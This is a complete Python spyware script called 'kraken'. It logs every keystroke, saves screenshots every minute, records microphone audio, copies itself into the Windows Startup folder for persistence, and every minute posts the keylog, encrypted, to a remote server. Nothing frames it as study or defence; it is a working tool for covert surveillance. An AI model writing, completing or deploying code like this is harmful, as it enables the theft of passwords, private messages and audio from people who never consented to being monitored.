import time
import os
import shutil
import sys
import threading
import logging
import pyautogui
import pyaudio
import wave
import requests
import base64
from cryptography.fernet import Fernet
from pynput.keyboard import Listener

# Setup logging to a file
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))  # Capture alphanumeric keys
    except AttributeError:
        logging.info(str(key))  # Capture special keys like space, enter, etc.

def capture_screenshot(interval=60):
    while True:
        screenshot = pyautogui.screenshot()
        screenshot.save(f"screenshot_{int(time.time())}.png")
        time.sleep(interval)

def record_audio(duration=10, sample_rate=44100, channels=1):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                   channels=channels,
                   rate=sample_rate,
                   input=True,
                   frames_per_buffer=1024)
    frames = []
    for i in range(0, int(sample_rate / 1024 * duration)):
        data = stream.read(1024)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(f"audio_{int(time.time())}.wav", 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(sample_rate)
    wf.writeframes(b''.join(frames))
    wf.close()

def make_persistent():
    startup_dir = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    script_path = os.path.join(startup_dir, "kraken.py")
    shutil.copy2(sys.argv[0], script_path)

def encrypt_data(data):
    key = Fernet.generate_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data.encode())
    return encrypted_data, key

def exfiltrate_data(encrypted_data, key):
    url = "https://your-remote-server.com/receive_data"
    data = {
        "data": base64.b64encode(encrypted_data).decode(),
        "key": base64.b64encode(key).decode()
    }
    requests.post(url, data=data)

def start_kraken():
    make_persistent()
    with Listener(on_press=on_press) as listener:
        screenshot_thread = threading.Thread(target=capture_screenshot)
        screenshot_thread.start()
        audio_thread = threading.Thread(target=record_audio)
        audio_thread.start()
        while True:
            with open(log_file, "r") as f:
                log_data = f.read()
            encrypted_data, key = encrypt_data(log_data)
            exfiltrate_data(encrypted_data, key)
            time.sleep(60)  # Exfiltrate data every minute
        listener.join()

if __name__ == "__main__":
    start_kraken()
